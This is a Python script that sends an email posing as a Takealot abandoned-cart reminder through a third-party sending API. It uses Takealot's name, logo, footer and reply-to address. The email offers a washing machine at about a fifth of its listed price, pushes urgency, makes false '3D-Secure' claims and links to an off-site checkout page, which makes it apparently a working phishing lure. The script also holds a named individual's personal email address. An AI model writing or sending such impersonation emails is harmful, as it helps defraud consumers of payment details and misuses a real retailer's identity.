import urllib.request, json, time

api_key = ""
to_email = "pchristiano384@gmail.com"
customer_name = "Christiano"
amount = "1899"
old_price = "8,999"
product_title = 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)'
product_image = "https://iili.io/oKD3ZQa.jpg"
checkout_url = "http://localhost:3015/checkout.html?price=1899&qty=1"

html_body = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Complete Your Takealot Order</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #333333;">
  <div style="max-width: 600px; margin: 20px auto; background: #ffffff; border-radius: 8px; overflow: hidden; border: 1px solid #e1e4e8;">
    
    <!-- HEADER -->
    <div style="background-color: #ffffff; padding: 26px 20px; text-align: center; border-bottom: 2px solid #0b56a4;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Takealot_logo.svg/500px-Takealot_logo.svg.png" alt="takealot.com" width="190" style="display: block; margin: 0 auto; max-width: 190px; height: auto;" />
    </div>

    <!-- CONTENT -->
    <div style="padding: 32px 26px;">
      <div style="display: inline-block; background-color: #fff1f2; color: #e11d48; padding: 6px 14px; border-radius: 20px; font-size: 12.5px; font-weight: 800; margin-bottom: 20px; letter-spacing: 0.3px; border: 1px solid #fecdd3;">
        ⏳ LIMITED TIME: PROMOTIONAL PRICE RESERVED
      </div>
      
      <h2 style="font-size: 20px; font-weight: 800; color: #0b56a4; margin-top: 0; margin-bottom: 12px;">
        Hi {customer_name},
      </h2>
      
      <p style="font-size: 14.5px; line-height: 1.6; color: #4a5568; margin-top: 0;">
        We noticed you started checking out on Takealot, but didn't finish your order! Good news: we have temporarily saved the items in your cart so you won't lose this special promotional deal.
      </p>

      <!-- RESERVED PRODUCT CARD -->
      <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 18px; margin: 22px 0;">
        <div style="font-size: 11.5px; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 12px; border-bottom: 1px solid #e2e8f0; padding-bottom: 6px;">
          Reserved Item in Your Cart
        </div>
        
        <table style="width: 100%; border-collapse: collapse;">
          <tr>
            <td style="width: 84px; vertical-align: top; padding-right: 14px;">
              <img src="{product_image}" alt="Samsung 9kg Washing Machine" width="80" height="80" style="display: block; width: 80px; height: 80px; object-fit: contain; border: 1px solid #e2e8f0; border-radius: 6px; background-color: #ffffff; padding: 3px;" />
            </td>
            <td style="vertical-align: top;">
              <div style="font-size: 14px; font-weight: 700; color: #1a202c; line-height: 1.4;">{product_title}</div>
              <div style="font-size: 12px; color: #64748b; margin-top: 4px;">Quantity: 1 &bull; Condition: Brand New &bull; Fast Delivery</div>
              <div style="margin-top: 8px;">
                <span style="font-size: 18px; font-weight: 800; color: #0b56a4;">R {amount}</span>
                <span style="font-size: 13px; color: #94a3b8; text-decoration: line-through; margin-left: 6px;">R {old_price}</span>
                <span style="display: inline-block; background: #e0f2fe; color: #0369a1; font-size: 11px; font-weight: 700; padding: 2px 6px; border-radius: 4px; margin-left: 6px;">SPECIAL DEAL</span>
              </div>
            </td>
          </tr>
        </table>
      </div>

      <!-- BIG RECOVERY CTA BUTTON -->
      <a href="{checkout_url}" style="display: block; text-align: center; background-color: #0b56a4; color: #ffffff !important; text-decoration: none; padding: 16px 24px; border-radius: 6px; font-size: 16px; font-weight: 800; margin: 26px 0 12px; letter-spacing: 0.3px; box-shadow: 0 4px 12px rgba(11, 86, 164, 0.25);">
        Complete Your Order Now &rarr;
      </a>

      <p style="font-size: 12.5px; color: #718096; text-align: center; margin: 12px 0 0;">
        Safe, encrypted &amp; verified 3D-Secure payment. Free delivery included.
      </p>

      <!-- TRUST BADGES -->
      <table style="width: 100%; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px; margin-top: 24px; text-align: center; font-size: 12px; color: #475569; padding: 12px 6px;">
        <tr>
          <td style="width: 33.3%;">🔒 <strong>100% Secure</strong><br><span style="font-size: 10.5px; color: #64748b;">3D-Secure Protected</span></td>
          <td style="width: 33.3%; border-left: 1px solid #e2e8f0; border-right: 1px solid #e2e8f0;">🚚 <strong>Fast Delivery</strong><br><span style="font-size: 10.5px; color: #64748b;">Direct to your door</span></td>
          <td style="width: 33.3%;">↩️ <strong>Easy Returns</strong><br><span style="font-size: 10.5px; color: #64748b;">30-Day Hassle Free</span></td>
        </tr>
      </table>
    </div>

    <!-- FOOTER -->
    <div style="background-color: #f1f5f9; padding: 22px; text-align: center; font-size: 11.5px; color: #64748b; line-height: 1.6; border-top: 1px solid #e2e8f0;">
      &copy; 2026 Takealot Online (Pty) Ltd. 12th Floor, Takealot Building, 10 Rua Vasco Da Gama Plain, Foreshore, Cape Town, 8001.<br>
      All rights reserved. Customer Support: <a href="mailto:support@takealot.co.za" style="color: #0b56a4; text-decoration: none;">support@takealot.co.za</a>
    </div>
  </div>
</body>
</html>"""

text_body = f"""Hi {customer_name},

Did you forget something?
Your order for the {product_title} is currently reserved in your cart at the promotional price of R {amount}.

Due to high demand, promotional stock can only be held for a limited time.

Complete your order here:
{checkout_url}

Thank you,
The Takealot Team
support@takealot.co.za"""

payload = {
    "idempotency_key": f"takealot-abandoned-recovery-{int(time.time() * 1000)}",
    "channel": "email",
    "sender_name": "Takealot.com",
    "to": to_email,
    "message": {
        "subject": "Did you forget something? Your Takealot order is reserved!",
        "text": text_body,
        "html": html_body,
        "reply_to": "support@takealot.co.za"
    },
    "metadata": {
        "email_type": "checkout_recovery",
        "store": "takealot"
    }
}

req = urllib.request.Request(
    "https://greensend.app/v1/messages",
    data=json.dumps(payload).encode("utf-8"),
    headers={
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
)

resp = urllib.request.urlopen(req)
print("SUCCESS RECOVERY EMAIL SENT:")
print(resp.read().decode("utf-8"))
